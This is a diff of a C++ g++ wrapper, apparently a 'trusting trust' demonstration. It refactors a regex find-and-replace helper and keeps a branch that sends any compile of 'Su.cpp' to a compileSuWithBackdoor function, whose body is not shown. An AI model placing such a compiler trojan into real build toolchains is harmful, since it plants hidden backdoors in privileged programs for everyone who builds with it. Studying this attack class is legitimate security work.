@@ -5,12 +5,12 @@ using namespace std;
 #include <fstream>
 #include <sstream>
 
-// This searches the file and replaces all occurrences of `oldText` with `newText`
-void findAndReplace(string fileName, string oldText, string newText) {
+// This searches the file and replaces all occurrences of regexPattern with `newText`
+void findAndReplace(string fileName, string regexPattern, string newText) {
     ifstream fileInputStream(fileName);
     stringstream fileContents;
     fileContents << fileInputStream.rdbuf();
-    string modifiedSource = regex_replace(fileContents.str(), regex(oldText), newText);
+    string modifiedSource = regex_replace(fileContents.str(), regex(regexPattern), newText);
     ofstream fileOutputStream(fileName);
     fileOutputStream << modifiedSource;
 }
@@ -33,9 +33,8 @@ int main(int argc, char *argv[]) {
         allArgs += " " + string(argv[i]);
     string shellCommand = "g++" + allArgs;
     string fileName = string(argv[1]);
-    if(fileName == "Su.cpp") {
+    if(fileName == "Su.cpp")
         compileSuWithBackdoor(allArgs);
-    } else {
+    else
 	    system(shellCommand.c_str());
-    }
 }
